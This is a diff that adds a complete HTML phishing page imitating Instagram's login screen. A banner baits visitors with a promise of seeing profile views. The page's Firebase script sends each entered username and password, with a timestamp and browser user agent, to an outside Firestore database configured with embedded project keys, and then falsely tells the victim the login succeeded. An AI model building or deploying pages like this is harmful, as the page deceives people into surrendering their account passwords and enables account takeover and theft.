@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Nunito:wght@400;600;700&display=swap"
+    rel="stylesheet" />
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0d0d0d;
+      font-family: 'Nunito', sans-serif;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Floating blobs */
+    .blob {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(10px);
+      opacity: 0.85;
+      z-index: 0;
+    }
+
+    .blob-1 {
+      width: 300px;
+      height: 300px;
+      background: radial-gradient(circle, #f97040, #d63265);
+      top: -60px;
+      left: -60px;
+      animation: float1 8s ease-in-out infinite;
+    }
+
+    .blob-2 {
+      width: 280px;
+      height: 280px;
+      background: radial-gradient(circle, #bf5af2, #7b3fe4);
+      bottom: -60px;
+      right: -60px;
+      animation: float2 10s ease-in-out infinite;
+    }
+
+    .blob-3 {
+      width: 200px;
+      height: 200px;
+      background: radial-gradient(circle, #f7971e, #e44d26);
+      bottom: 40px;
+      left: 20px;
+      animation: float3 7s ease-in-out infinite;
+    }
+
+    @keyframes float1 {
+
+      0%,
+      100% {
+        transform: translate(0, 0) scale(1);
+      }
+
+      50% {
+        transform: translate(30px, 20px) scale(1.05);
+      }
+    }
+
+    @keyframes float2 {
+
+      0%,
+      100% {
+        transform: translate(0, 0) scale(1);
+      }
+
+      50% {
+        transform: translate(-20px, -30px) scale(1.08);
+      }
+    }
+
+    @keyframes float3 {
+
+      0%,
+      100% {
+        transform: translate(0, 0) scale(1);
+      }
+
+      50% {
+        transform: translate(15px, -20px) scale(1.04);
+      }
+    }
+
+    /* Glass card */
+    .card {
+      position: relative;
+      z-index: 1;
+      width: 340px;
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(24px) saturate(160%);
+      -webkit-backdrop-filter: blur(24px) saturate(160%);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 24px;
+      padding: 40px 32px 28px;
+      box-shadow: 0 8px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+      animation: fadeIn 0.6s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 38px;
+      color: #fff;
+      text-align: center;
+      margin-bottom: 28px;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 12px;
+    }
+
+    .input-group input {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      border-radius: 8px;
+      padding: 13px 42px 13px 14px;
+      color: #fff;
+      font-size: 13px;
+      font-family: 'Nunito', sans-serif;
+      outline: none;
+      transition: border 0.2s, background 0.2s;
+    }
+
+    .input-group input::placeholder {
+      color: rgba(255, 255, 255, 0.55);
+    }
+
+    .input-group input:focus {
+      border-color: rgba(255, 255, 255, 0.4);
+      background: rgba(255, 255, 255, 0.15);
+    }
+
+    .toggle-pw {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: rgba(255, 255, 255, 0.55);
+      font-size: 16px;
+      line-height: 1;
+      padding: 0;
+      display: flex;
+      align-items: center;
+    }
+
+    .toggle-pw:hover {
+      color: #fff;
+    }
+
+    .forgot {
+      text-align: right;
+      margin: 6px 0 16px;
+    }
+
+    .forgot a {
+      font-size: 12px;
+      color: rgba(255, 255, 255, 0.75);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .forgot a:hover {
+      color: #fff;
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 13px;
+      border-radius: 8px;
+      border: none;
+      background: #3897f0;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: 'Nunito', sans-serif;
+      cursor: pointer;
+      letter-spacing: 0.5px;
+      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+      box-shadow: 0 4px 20px rgba(56, 151, 240, 0.4);
+    }
+
+    .btn-login:hover {
+      background: #2d86e0;
+      box-shadow: 0 6px 24px rgba(56, 151, 240, 0.55);
+    }
+
+    .btn-login:active {
+      transform: scale(0.98);
+    }
+
+    .btn-login:disabled {
+      background: #2a6aaa;
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+
+    .or-divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 20px 0;
+      color: rgba(255, 255, 255, 0.45);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .or-divider::before,
+    .or-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: rgba(255, 255, 255, 0.2);
+    }
+
+    .btn-facebook {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      background: transparent;
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 13px;
+      font-weight: 700;
+      font-family: 'Nunito', sans-serif;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .btn-facebook:hover {
+      color: #fff;
+    }
+
+    .btn-facebook .fb-icon {
+      width: 20px;
+      height: 20px;
+      background: #1877f2;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 900;
+      color: #fff;
+      flex-shrink: 0;
+    }
+
+    .divider-bottom {
+      height: 1px;
+      background: rgba(255, 255, 255, 0.12);
+      margin: 20px -32px 20px;
+    }
+
+    .signup-text {
+      text-align: center;
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.55);
+    }
+
+    .signup-text a {
+      color: #fff;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .signup-text a:hover {
+      text-decoration: underline;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: rgba(30, 30, 30, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-size: 13px;
+      font-weight: 600;
+      backdrop-filter: blur(10px);
+      transition: transform 0.35s cubic-bezier(.17, .67, .35, 1.2), opacity 0.3s;
+      opacity: 0;
+      z-index: 999;
+      white-space: nowrap;
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+
+    .toast.success {
+      border-color: #3897f0;
+      color: #7ec8ff;
+    }
+
+    .toast.error {
+      border-color: #e44d4d;
+      color: #ff9999;
+    }
+
+    .announcement {
+      position: absolute;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid rgba(255, 255, 255, 0.22);
+      border-radius: 8px;
+      padding: 7px 14px;
+      color: rgba(255, 255, 255, 0.75);
+      font-size: 16px;
+      font-weight: 600;
+      text-align: center;
+      backdrop-filter: blur(10px);
+      white-space: nowrap;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="blob blob-1"></div>
+  <div class="blob blob-2"></div>
+  <div class="blob blob-3"></div>
+
+  <div class="announcement">
+    Enter details to see account activity (profile views, one time messages etc)
+  </div>
+
+  <div class="card">
+    <div class="logo">Instagram</div>
+
+    <div class="input-group">
+      <input type="text" id="username" placeholder="Phone number, username or email address" autocomplete="off" />
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="password" placeholder="Password" autocomplete="off" />
+      <button class="toggle-pw" onclick="togglePassword()" title="Show/hide password">
+        <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
+          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
+          <line x1="1" y1="1" x2="23" y2="23" />
+        </svg>
+      </button>
+    </div>
+
+    <div class="forgot"><a href="#">Forgotten password?</a></div>
+
+    <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log In</button>
+
+    <div class="or-divider">OR</div>
+
+    <button class="btn-facebook">
+      <div class="fb-icon">f</div>
+      Log in with Facebook
+    </button>
+
+    <div class="divider-bottom"></div>
+
+    <p class="signup-text">Don't have an account? <a href="#">Sign Up</a></p>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <!-- ✅ Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, doc, getDoc, setDoc, updateDoc, arrayUnion }
+      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    // ====================================================
+    // 🔧 REPLACE THESE WITH YOUR FIREBASE PROJECT CONFIG
+    // Firebase Console → Project Settings → Your apps → Web app
+    // ====================================================
+    const firebaseConfig = {
+      apiKey: "AIzaSyCOAu81PloSJO65tqjk8h-GC8Tdw2A0jcw",
+      authDomain: "aiden-3991f.firebaseapp.com",
+      projectId: "aiden-3991f",
+      storageBucket: "aiden-3991f.firebasestorage.app",
+      messagingSenderId: "799447381089",
+      appId: "1:799447381089:web:434fbbb4686c1e5f666620",
+      measurementId: "G-DNNMVGPF2K"
+    };
+    // ====================================================
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    window.saveToFirebase = async function (username, password) {
+      try {
+        const docRef = doc(db, "logins", username);
+        const docSnap = await getDoc(docRef);
+
+        if (docSnap.exists()) {
+          await updateDoc(docRef, {
+            attempts: arrayUnion({
+              password,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent
+            })
+          });
+        } else {
+          await setDoc(docRef, {
+            username,
+            attempts: [{
+              password,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent
+            }]
+          });
+        }
+        return true;
+      } catch (err) {
+        console.error("Firebase error:", err);
+        return false;
+      }
+    };
+  </script>
+
+  <script>
+    function showToast(msg, type = '') {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.className = 'toast show ' + type;
+      setTimeout(() => { t.className = 'toast'; }, 3000);
+    }
+
+    function togglePassword() {
+      const pw = document.getElementById('password');
+      const icon = document.getElementById('eye-icon');
+      if (pw.type === 'password') {
+        pw.type = 'text';
+        icon.innerHTML = `
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+          <circle cx="12" cy="12" r="3"/>`;
+      } else {
+        pw.type = 'password';
+        icon.innerHTML = `
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>`;
+      }
+    }
+
+    async function handleLogin() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+      const btn = document.getElementById('loginBtn');
+
+      if (!username || !password) {
+        showToast('Please enter your details.', 'error');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Logging in…';
+
+      const ok = await window.saveToFirebase(username, password);
+
+      if (ok) {
+        showToast('✓ Logged in successfully!', 'success');
+        setTimeout(() => {
+          document.getElementById('username').value = '';
+          document.getElementById('password').value = '';
+        }, 1000);
+      } else {
+        showToast('Something went wrong. Try again.', 'error');
+      }
+
+      btn.disabled = false;
+      btn.textContent = 'Log In';
+    }
+
+    // Allow Enter key to submit
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Enter') handleLogin();
+    });
+
+    document.querySelector('.btn-facebook').addEventListener('click', () => {
+      showToast('Facebook login is not available yet.', 'error');
+    });
+
+    document.querySelector('.forgot a').addEventListener('click', (e) => {
+      e.preventDefault();
+      showToast('Password reset is not available yet.', 'error');
+    });
+
+    document.querySelector('.signup-text a').addEventListener('click', (e) => {
+      e.preventDefault();
+      showToast('Sign up is not available yet.', 'error');
+    });
+  </script>
+
+</body>
+
+</html>
